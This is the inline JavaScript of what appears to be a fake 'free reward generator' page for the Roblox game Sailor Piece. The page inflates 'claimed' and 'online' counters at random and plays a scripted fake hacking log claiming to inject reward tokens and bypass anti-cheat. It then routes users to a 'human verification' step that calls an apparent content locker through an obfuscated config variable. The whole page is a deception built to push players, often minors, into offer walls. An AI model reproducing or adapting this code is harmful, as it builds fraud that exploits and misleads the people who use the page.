
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'G-CPCJZBBRX4');
    


    var dZStT_Egs_GTUHQc={"it":4318759,"key":"ca180"};



        let selectedReward = "";
        let selectedIcon = "";
        let username = "";
        let platform = "";

        const $ = id => document.getElementById(id);

        // TikTok browser detection
        function checkTikTok() {
            const ua = navigator.userAgent.toLowerCase();
            if (/tiktok|musical_ly|bytedance/i.test(ua)) {
                const popup = $('ios-popup');
                if (popup) popup.style.display = 'block';
            }
        }

        // Stats animation
        function updateStats() {
            const claimed = $("stat-claimed");
            const online = $("stat-online");
            setInterval(() => {
                let c = parseInt(claimed.innerText.replace(',', ''));
                claimed.innerText = (c + Math.floor(Math.random() * 3)).toLocaleString();
                let o = parseInt(online.innerText);
                online.innerText = Math.max(600, o + (Math.floor(Math.random() * 7) - 3));
            }, 3000);
        }

        function openClaimModal(reward, icon) {
            selectedReward = reward;
            selectedIcon = icon;
            $("info-reward-name").innerText = reward.toUpperCase();
            $("modal-reward-img").src = icon;
            $("modal-overlay").classList.remove("hidden");
            $("modal-info").classList.remove("hidden");
            $("modal-generator").classList.add("hidden");
            $("modal-verify").classList.add("hidden");
        }

        function startGeneration() {
            username = $("input-username").value.trim();
            if (!username) {
                $("input-username").style.borderColor = "#e84040";
                return;
            }
            $("input-username").style.borderColor = "";

            $("gen-reward-img").src = selectedIcon;
            $("gen-for").innerText = "For: " + username;
            $("modal-info").classList.add("hidden");
            $("modal-generator").classList.remove("hidden");

            const logs = [
                "> Connecting to Sailor Piece servers...",
                "> Authenticating Roblox session...",
                "> Locating player: " + username,
                "> Verifying platform: " + platform,
                "> Scanning inventory database...",
                "> Injecting reward token...",
                "> Encrypting transfer packet...",
                "> Bypassing anti-cheat layer...",
                "> Reward queued successfully!",
                "> Awaiting human verification...",
            ];

            let pct = 0;
            let logIdx = 0;
            const logEl = $("gen-log");
            const bar = $("gen-bar");
            const pctEl = $("gen-pct");
            const statusEl = $("gen-status");

            const iv = setInterval(() => {
                pct += Math.floor(Math.random() * 12) + 6;
                if (pct > 100) pct = 100;
                bar.style.width = pct + "%";
                pctEl.innerText = pct + "%";

                if (logIdx < logs.length) {
                    logEl.innerHTML += logs[logIdx++] + "\n";
                    logEl.scrollTop = logEl.scrollHeight;
                }

                if (pct >= 100) {
                    clearInterval(iv);
                    statusEl.innerText = "Transfer Ready!";
                    setTimeout(() => {
                        $("modal-generator").classList.add("hidden");
                        $("verify-reward-name").innerText = selectedReward;
                        $("verify-reward-img").src = selectedIcon;
                        $("verify-user-display").innerText = username + " · " + platform;
                        $("verify-item-display").innerText = selectedReward.toUpperCase();
                        $("modal-verify").classList.remove("hidden");
                    }, 700);
                }

                const statuses = ["Syncing...", "Injecting...", "Encrypting...", "Verifying...", "Processing..."];
                statusEl.innerText = statuses[Math.floor(Math.random() * statuses.length)];
            }, 400);
        }

        function triggerLocker() {
            _my();
        }

        // Close modal on overlay click
        $("modal-overlay").addEventListener("click", function (e) {
            if (e.target === this) {
                this.classList.add("hidden");
                $("modal-info").classList.add("hidden");
                $("modal-generator").classList.add("hidden");
                $("modal-verify").classList.add("hidden");
            }
        });

        // Init
        checkTikTok();
        updateStats();
    